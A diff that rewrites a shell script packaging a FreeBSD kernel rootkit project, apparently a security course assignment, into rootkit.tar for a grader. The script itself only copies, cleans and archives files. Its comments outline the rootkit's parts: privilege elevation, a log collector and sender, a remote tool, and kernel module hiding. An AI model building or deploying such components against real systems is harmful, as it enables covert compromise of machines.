@@ -1,3 +1,54 @@
 #!/bin/sh
 
-tar -cvf rootkit.tar kernel user elevate install remote.c remote
+# Packs the archive the grader expects: install, elevate, log and remote must
+# sit at the top level and stay executable inside the archive, because it runs
+# them as ./install, ./elevate, ./log and ./remote.
+#
+# Everything else that ships is source and documentation: kernel/ (the module
+# plus log.c), user/ (elevate and hide_kld built by install), logsrc/ (the
+# collector and the sender behind ./log and rklog), hiding/ and install_hiding
+# (the separate hiding prototype), and the two markdown files.
+#
+# Build artifacts from an in-tree `make -C kernel` are stripped from the copy:
+# kernel/machine, kernel/x86 and kernel/i386 are absolute symlinks into
+# /usr/src/sys and would point at the wrong tree (or nowhere) on the grader's
+# machine, and the generated vnode_if*.h files are rebuilt by kmod.mk anyway.
+
+set -eu
+
+cd "$(dirname "$0")"
+
+for entry in install elevate log remote; do
+    [ -f "$entry" ] || { echo "missing entry point: $entry" >&2; exit 1; }
+    chmod 755 "$entry"
+done
+
+OUT="$PWD/rootkit.tar"
+STAGE=$(mktemp -d)
+trap 'rm -rf "$STAGE"' EXIT
+
+FILES="install elevate log remote remote.c kernel user logsrc hiding \
+       install_hiding hide_kld.c README.md writeup.md LOG_TESTING.md"
+
+LIST=""
+for path in $FILES; do
+    [ -e "$path" ] || continue
+    cp -R "$path" "$STAGE/"
+    LIST="$LIST $path"
+done
+
+for dir in kernel hiding; do
+    [ -d "$STAGE/$dir" ] || continue
+    rm -rf "$STAGE/$dir/machine" "$STAGE/$dir/x86" "$STAGE/$dir/i386"
+    rm -f "$STAGE/$dir"/*.o "$STAGE/$dir"/*.ko "$STAGE/$dir"/.depend* \
+          "$STAGE/$dir"/vnode_if*.h "$STAGE/$dir"/export_syms
+done
+
+# Normalise modes: tree copies picked up over a shared folder arrive as 0770,
+# and the grader may unpack as another user. Sources must stay readable and the
+# four entry points must stay executable inside the archive.
+chmod -R a+rX,go-w "$STAGE"
+chmod 755 "$STAGE"/install "$STAGE"/elevate "$STAGE"/log "$STAGE"/remote
+
+# shellcheck disable=SC2086  # LIST is a deliberate word list
+( cd "$STAGE" && tar -cvf "$OUT" $LIST )
